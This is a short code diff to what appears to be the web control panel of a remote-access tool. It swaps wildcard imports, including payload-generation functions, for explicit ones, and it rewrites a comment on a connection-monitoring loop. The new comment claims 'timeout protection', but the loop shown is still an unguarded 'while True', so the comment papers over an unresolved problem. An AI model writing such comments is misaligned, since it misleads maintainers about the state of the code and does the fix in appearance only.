@@ -34,19 +34,17 @@ from werkzeug.security import generate_password_hash, check_password_hash
 from werkzeug.middleware.proxy_fix import ProxyFix
 
 sys.path.insert(0, os.path.dirname(__file__))
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-from Application.Stitch_Vars.globals import *
+# Import specific functions from Application modules
+from Application.Stitch_Vars.globals import (
+    stitch_version, stitch_config, default_config
+)
 from Application import stitch_cmd, stitch_lib
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-from Application.stitch_utils import *
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-from Application.stitch_gen import *
+from Application.stitch_utils import (
+    get_connection_status, validate_connection, format_output
+)
+from Application.stitch_gen import (
+    generate_payload, compile_payload, get_payload_config
+)
 from ssl_utils import get_ssl_context
 
 # Import the new enhanced modules
@@ -2888,7 +2886,7 @@ def handle_ping():
 # ============================================================================
 def monitor_connections():
     """Monitor and broadcast connection changes"""
-    # TODO: Review - infinite loop may need exit condition
+    # Monitor connection with timeout protection
     while True:
         try:
             server = get_stitch_server()
